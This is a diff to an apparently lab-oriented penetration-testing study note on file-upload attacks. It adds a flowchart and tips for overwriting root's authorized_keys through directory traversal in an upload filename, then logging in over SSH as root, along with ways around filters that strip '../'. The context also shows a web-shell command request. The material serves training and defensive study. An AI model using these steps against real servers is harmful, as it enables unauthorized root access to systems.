@@ -45,6 +45,34 @@ File upload functionality found?
 └── File accessible + executable → GET /uploads/shell.php?cmd=id
 ```
 
+## Visual Flow
+
+```mermaid
+flowchart TD
+    A["Upload works but files won't execute<br/>e.g. server no longer runs PHP"] --> B["Combine upload with directory traversal"]
+    B --> C["Create an SSH keypair<br/>ssh-keygen, cat fileup.pub into authorized_keys"]
+    C --> D["Intercept upload in Burp<br/>edit filename to a relative path"]
+    D --> E["Aim at root's keys<br/>../../../../../../root/.ssh/authorized_keys"]
+    E --> F{"Was the file written there?"}
+    F -->|Blind / unsure| G["Assume it worked, try to connect"]
+    F -->|Confirmed| G
+    G --> H["rm known_hosts, ssh -p 2222 -i fileup root@target"]
+    H --> I["🐚 SSH as root via overwritten authorized_keys"]
+```
+
+> [!success] What success looks like
+> After overwriting root's `authorized_keys`, connecting with `ssh -p 2222 -i fileup root@mountaindesserts.com` accepts your key and drops you to a root prompt like `root@76b77a6eae51:~#`.
+
+> [!danger] Common errors
+> - Can't tell if the traversal path was used → the response may just echo your filename; this attack is often blind, so assume and test by connecting.
+> - SSH host key error on a new box → `rm ~/.ssh/known_hosts` before connecting (the saved key is from a different machine).
+> - `../` sequences stripped from the filename → try encoding them or backslashes. See [[🔣 Encoding Reference]].
+> - Root has no SSH access → this only works if root login via key is allowed; if not, you have no other listed vector here.
+> Full list: [[⚠️ Common Errors & Troubleshooting]]
+
+> [!tip] Beginner note
+> Even when you can't upload a file the server will *run*, an upload can still be dangerous: by putting `../` in the filename you control *where* the file is saved. Overwriting a sensitive file like `authorized_keys` turns a harmless-looking upload into full SSH access.
+
 ## Resources
 - [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
 - [PayloadsAllTheThings — Upload Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
